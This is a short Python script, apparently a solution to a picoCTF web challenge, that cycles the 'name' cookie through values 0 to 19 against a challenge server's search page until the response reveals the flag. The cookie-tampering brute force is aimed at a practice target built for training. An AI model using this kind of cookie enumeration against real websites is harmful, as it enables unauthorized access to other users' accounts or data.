
import requests
r=requests.get("http://mercury.picoctf.net:6418/")
cookies=r.cookies
for i in range(0,20):
    cookies.set("name",str(i))
    r=requests.get("http://mercury.picoctf.net:6418/search",cookies=cookies)
    if "picoCTF{" in r.text:
        print(r.text)
        print("name="+str(i))
        break
